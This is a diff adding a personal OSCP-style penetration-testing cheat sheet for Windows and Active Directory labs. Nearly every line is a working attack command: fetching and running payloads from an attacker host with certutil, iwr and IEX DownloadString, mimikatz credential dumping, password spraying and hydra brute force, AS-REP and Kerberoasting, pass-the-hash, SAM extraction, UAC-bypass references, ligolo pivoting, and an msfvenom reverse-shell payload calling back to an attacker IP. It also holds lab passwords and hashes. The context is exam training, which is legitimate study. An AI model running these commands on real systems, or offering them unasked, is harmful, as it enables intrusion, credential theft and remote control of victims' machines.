@@ -1,0 +1,233 @@
+
+ ALL Commands You i well need 
+ 
+[Downloads Files]
+
+certutil -urlcache -split -f http://ip:port/file
+
+Ex. certutil -urlcache -split -f http://192.168.45.174:8000/winpeas.exe
+
+iwr -Uri http://ip:port/winpeas.exe -OutFile winpeas.exe
+
+Ex. iwr -Uri http://192.168.45.174:8000/winpeas.exe -OutFile winpeas.exe
+
+Invoke-WebRequest -Uri http://ip/winpeas.exe -OutFile winpeas.exe
+
+[ smbclient ]
+
+smbclient -L //192.168.240.143 -U oscp.exam/iis_svc%Password@1
+
+smbclient //192.168.240.143 -U oscp.exam/iis_svc%Password@1
+
+[ mimikatz ]
+.\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # log
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::wdigest
+
+# Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+
+> https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mimikatz-cheatsheet/#summary
+[Tools command you will need]
+
+Spray Password using crackmapexec
+
+crackmapexec smb ips.txt -u USERLIST -p PASSWORDS -d oscp.exam --continue-on-success
+
+Spray Password using NetExec
+
+netexec smb ips.txt -u USERLIST -p PASSWORDS -d oscp.exam --continue-on-success
+
+AS rep 
+
+crackmapexec ldap 10.10.160.146 -u users.txt -p '' --asreproast
+
+netexec ldap 10.10.160.146 -u users.txt -p '' --asreproast
+
+Kerb
+
+crackmapexec ldap 10.10.160.146 -u users.txt -p '' -k
+
+crackmapexec ldap 10.10.160.146 -u users.txt -p '' -k
+
+# As what we see in labs somtimes crackmapexec and netexec give us false Positive try add domain or do it manaualy
+
+
+[ Poweshell ] 
+
+powershell -ExecutionPolicy Bypass
+
+powershell -ep bypass 
+
+Import-Module .\Whatever.ps1
+
+[BruteForce]
+
+hydra -L usernames-ad.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.200.147
+
+hydra -I -V -C creds.txt -t 1 "http-get://ip:8080/manager/html:A=BASIC:F=401"
+
+using patator http auth
+ 
+patator http_fuzz auth_type=basic url=http://10.1.1.15 user_pass=FILE0 0=./passwd_lists/user_pass.txt -x ignore:code=401
+
+patator ftp_login host=192.168.60.50 user=FILE0 password=FILE1 0=/root/username 1=/root/wordlist.txt -x ignore:code=530
+
+
+[ enum users using kerbrute ]
+
+kerbrute userenum --dc ipdc -d oscp.exam /usr/share/wordlists/rockyou.txt
+
+[ mysql connect ]
+
+impacket-mssqlclient -windows-auth oscp.exam/sql_svc:Dolphin1@10.10.160.148
+
+mysql --user=root --password=PASS -e "use DNN; Show tables; select * from DNN;"
+
+[ evil-winrm ] 
+
+Pass the hash
+
+evil-winrm -i 10.10.160.146 -u administrator -H 59b280ba707d22e3ef0aa587fc29ffe5 
+
+evil-winrm -i 10.10.160.146 -u administrator -p PASS@123
+
+[ Kerberos pre-authentication ]
+
+impacket-GetNPUsers oscp.exam/celia.almeda:7k8XHk3dMtmpnC7 -dc-ip 10.10.160.146 -request
+
+using list 
+
+impacket-GetNPUsers.py oscp.exam/ -usersfile users.txt -dc-ip 10.10.160.146 -format hashcat -outputfile hashes.txt
+
+powershell -c "iwr -Uri 192.168.49.100/win.exe -OutFile win.exe"
+powershell "IEX(New-Object Net.WebClient).downloadString('http://192.168.49.100/winpeas.ps1')"
+
+
+[ Pivoting Using Ligolo ]
+
+don't forget to Change route range
+sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up && ip addr show ligolo && sudo ip route add 172.16.100/24 dev ligolo
+
+After Download the agent
+agent.exe -connect 192.168.49.100:11601 -ignore-cert
+
+running Proxy
+./proxy -selfcert
+> session
+> 1
+> start
+
+Double Pivot 
+Download agent.exe
+
+ip route add 192.168.43.0/24 dev ligolo < Add the route u see it in ipconfig
+ip route
+
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+listener_list
+agent.exe -connect 192.168.45.174:11601 -ignore-cert
+
+> session
+> 2
+> start
+
+[ Get SPNs ]
+
+impacket-GetSPNUsers oscp.exam/username:password -dc-ip 10.10.160.146
+
+Pass the hash
+
+impacket-psexec medtech.com/Administrator@192.168.152.212 -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
+
+[ hashcat NTLM ]
+
+hashcat -m 5600 ntlmv2hash.txt /usr/share/wordlists/rockyou.txt 
+
+hashcat -m 18200 kerbTGThash.txt /usr/share/wordlists/rockyou.txt 
+
+hashcat -m 1000 ntlmhash.txt /usr/share/wordlists/rockyou.txt 
+
+hashcat -m 13100 kerbTGShash.txt /usr/share/wordlists/rockyou.txt 
+
+[ Enum As user And Admin ]
+
+winpeas.exe
+
+
+[ dump sam ] 
+
+impacket-secretsdump -just-dc-user brad relia.com/andrea:"PasswordPassword_6"@172.16.120.6
+
+in registery 
+
+reg save hklm\sam C:\Users\a.hansen\sam
+
+reg save hklm\system C:\Users\s.hansen\system
+
+impacket-secretsdump -sam SAM -system SYSTEM local                                        
+
+
+[ Privilege uac ]
+Check 
+reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System 
+if Lua 0*1
+And PrompetinSecureDesktop 0*1
+powershell -ep bypass
+
+Import-Module .\UACME.ps1
+
+Invoke-UAC
+
+Invoke-UAC callme.exe
+
+https://github.com/nobodyatall648/UAC_Bypass
+
+https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692
+
+https://github.com/tobor88/PowerShell-Red-Team/blob/master/Invoke-FodHelperBypass.ps1
+
+https://cocomelonc.github.io/malware/2023/06/19/malware-av-evasion-17.html
+
+https://github.com/itm4n/PrivescCheck
+
+https://github.com/CsEnox/EventViewer-UACBypass
+
+[ Full TTys Linux ]
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+script -qc /bin/bash /dev/null
+
+perl -e 'exec "/bin/sh";'
+
+[ msfvenom NO MetaSPLOIT !!!!! ]
+
+msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.181 lport=1331 -f exe > callme.exe
+
+
+[ https://www.thehacker.recipes/a-d/movement/dacl/targeted-kerberoasting ]
+
+impacket-targetedKerberoast -v -d oscp.lab -u user -p pass123 --dc-ip dc01
+
+
+[ Search ]
+
+cmd.exe only 
+
+dir /s/b ConsoleHost_*
+
+dir /s/b *.kdbx
+
+dir /s/b *.zip
+
+dir /s/b *.db
+
+dir /s/b note.db
+
